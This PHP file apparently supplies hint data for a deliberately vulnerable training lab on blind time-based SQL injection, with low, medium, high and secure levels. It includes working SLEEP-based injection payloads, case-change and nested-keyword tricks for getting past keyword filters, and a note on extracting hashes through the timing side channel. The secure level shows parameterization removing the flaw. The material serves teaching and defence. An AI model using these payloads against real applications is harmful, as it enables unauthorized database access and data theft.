<?php
$p = '/labs/sqli-blind/run?username=';
return [
  'low' => [
    'goal' => "Prove injection with a time delay, since the page shows no data.",
    'steps' => [
      "The response only says available/taken, so use time as the signal.",
      "Inject alice' AND SLEEP(2) -- - : a true condition runs SLEEP(2) on the server.",
      "The What Happened tab shows the elapsed milliseconds jump past 2000.",
    ],
    'why' => "Even with no visible output, your injected expression still executes. A deliberate pause proves code ran server-side; the same true/false timing oracle, applied to SUBSTRING of a hash, extracts data one character at a time.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("alice' AND SLEEP(2) -- -")]],
  ],
  'medium' => [
    'goal' => "Bypass the case-sensitive removal of SLEEP.",
    'steps' => [
      "str_replace removes the uppercase word SLEEP only.",
      "Use lowercase sleep: alice' AND sleep(2) -- - . MySQL function names are case-insensitive.",
    ],
    'why' => "The function runs regardless of case, but the filter only matched one spelling, so the lowercase form slips through and still pauses the query.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("alice' AND sleep(2) -- -")]],
  ],
  'high' => [
    'goal' => "Bypass the case-insensitive but single-pass removal.",
    'steps' => [
      "str_ireplace removes 'sleep' once, then stops.",
      "Nest it: SLsleepEEP. Removing the inner 'sleep' leaves SLEEP.",
      "Payload: alice' AND SLsleepEEP(2) -- - .",
    ],
    'why' => "One removal pass deletes the keyword you planted and the outer letters close back up into a real SLEEP call, which the database then executes.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("alice' AND SLsleepEEP(2) -- -")]],
  ],
  'secure' => [
    'goal' => "Confirm parameterization removes the timing side channel.",
    'steps' => [
      "The username is bound as a parameter, so it is only ever matched as a value.",
      "Send the SLEEP payload and note the response stays fast.",
    ],
    'why' => "Because the value never becomes SQL, there is no expression to evaluate and no delay to measure. The oracle disappears.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("alice' AND SLEEP(2) -- -")]],
  ],
];
